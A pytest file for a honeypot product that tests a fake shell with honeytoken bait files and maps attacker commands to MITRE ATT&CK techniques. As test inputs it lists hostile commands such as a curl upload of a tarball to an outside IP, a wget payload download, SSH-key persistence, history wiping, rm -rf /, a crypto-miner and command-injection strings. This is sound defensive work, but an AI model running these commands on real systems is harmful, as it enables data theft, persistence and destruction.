import pytest

from phantom.attack import TACTICS, TECHNIQUES, map_command, matrix
from phantom.deception import INTRUSION_PLAYBOOK, FakeShell
from phantom.models import DeployedDecoy

SECRETS = {"access_key": "PHKA-test", "api_token": "phtok-test", "db_password": "Pc7-test"}


def decoy(role, hostname, ip, port):
    return DeployedDecoy(id="x", name=hostname, image="img", role=role, hostname=hostname,
                         ip=ip, port=port)


@pytest.fixture
def shell():
    peers = [decoy("ssh-bastion", "vpn-gw-01", "10.13.50.10", 2222),
             decoy("database", "fin-db-02", "10.13.50.11", 3306)]
    return FakeShell("vpn-gw-01", "Acme", SECRETS, lambda: peers)


def test_basic_identity_commands(shell):
    assert shell.run("whoami") == "svc_backup"
    assert "uid=1001(svc_backup)" in shell.run("id")
    assert shell.run("hostname") == "vpn-gw-01"
    assert shell.prompt == "svc_backup@vpn-gw-01:~$"


def test_bait_files_contain_the_session_honeytokens(shell):
    assert SECRETS["access_key"] in shell.run("cat ~/.aws/credentials")
    assert SECRETS["db_password"] in shell.run("cat /var/www/html/config.php")
    assert "/var/www/html/config.php" in shell.run("find / -name '*.php'")


def test_navigation_and_listing(shell):
    assert shell.run("cd /opt/backup && pwd") == "/opt/backup"
    assert "backup.sh" in shell.run("ls")
    assert ".aws" in shell.run("ls -la ~") and ".aws" not in shell.run("ls ~")
    assert "No such file" in shell.run("cd /nope")
    assert shell.run("cd ../../etc/../home/svc_backup; pwd") == "/home/svc_backup"


def test_root_only_paths_are_denied(shell):
    assert "Permission denied" in shell.run("cat /etc/shadow")
    assert "Permission denied" in shell.run("ls /root")
    assert "Permission denied" in shell.run("echo x > /etc/passwd")


def test_pipes_redirects_and_history(shell):
    assert shell.run("cat /etc/passwd | grep deploy").startswith("deploy:")
    assert shell.run("echo 'ssh-ed25519 AAAA k' >> ~/.ssh/authorized_keys") == ""
    assert "ssh-ed25519 AAAA k" in shell.run("cat ~/.ssh/authorized_keys")
    assert "whoami" not in shell.run("history")
    shell.run("history -c")
    assert shell.run("history").strip().endswith("history")


def test_network_commands_reflect_the_decoy_grid(shell):
    assert "10.13.50.11 fin-db-02" in shell.run("cat /etc/hosts")
    assert "succeeded" in shell.run("nc -zv 10.13.50.11 3306")
    assert "timed out" in shell.run("nc -zv 10.13.50.99 3306")
    assert "10.13.50.11" in shell.run("for h in $(seq 1 30); do nc -zv 10.13.50.$h 3306; done")
    assert "ledger" in shell.run("mysql -h fin-db-02 -u app -psecret -e 'show databases'")
    assert "Network is unreachable" in shell.run("wget http://198.51.100.23/x.sh -O /tmp/x")


@pytest.mark.parametrize("line", [
    "nmap -sV 10.0.0.0/8", "python3 -c 'import os; os.system(\"id\")'", "$(reboot)", "`id`",
    "__class__", "run whoami", "; ; ;", "'unterminated", "a" * 256, "../../../../bin/sh",
])
def test_arbitrary_input_is_never_executed_and_never_crashes(shell, line):
    out = shell.run(line)
    assert isinstance(out, str) and len(out) <= 4000


def test_every_playbook_step_runs_and_maps_to_a_technique(shell):
    for step in INTRUSION_PLAYBOOK:
        command = step.command.format(subnet="10.13.50", db_host="fin-db-02", db_password="pw")
        shell.run(command)
        assert len(map_command(command)) >= 2, command  # unix shell + something specific


@pytest.mark.parametrize("command,expected", [
    ("cat /etc/passwd", {"T1003.008", "T1087.001"}),
    ("cat ~/.aws/credentials", {"T1552.001"}),
    ("cat ~/.bash_history", {"T1552.003"}),
    ("sudo -l", {"T1548.003"}),
    ("nc -zv 10.0.0.5 3306", {"T1046"}),
    ("ssh deploy@10.0.0.7", {"T1021.004"}),
    ("wget http://198.51.100.23/a.sh -O /tmp/a", {"T1105", "T1071.001"}),
    ("curl -F 'f=@/tmp/b.tgz' http://198.51.100.23/u", {"T1048.003"}),
    ("echo key >> ~/.ssh/authorized_keys", {"T1098.004"}),
    ("crontab -e", {"T1053.003"}),
    ("history -c", {"T1070.003"}),
    ("./xmrig -o stratum+tcp://pool:3333", {"T1496"}),
    ("rm -rf /", {"T1485", "T1070.004"}),
])
def test_command_mapping(command, expected):
    assert expected <= set(map_command(command))


def test_benign_text_only_maps_to_shell_execution():
    assert map_command("echo hello") == ["T1059.004"]
    assert map_command("   ") == []


def test_matrix_covers_every_technique_exactly_once():
    cells = [t["id"] for column in matrix() for t in column["techniques"]]
    assert sorted(cells) == sorted(TECHNIQUES)
    assert [c["id"] for c in matrix()] == [tid for tid, _ in TACTICS]
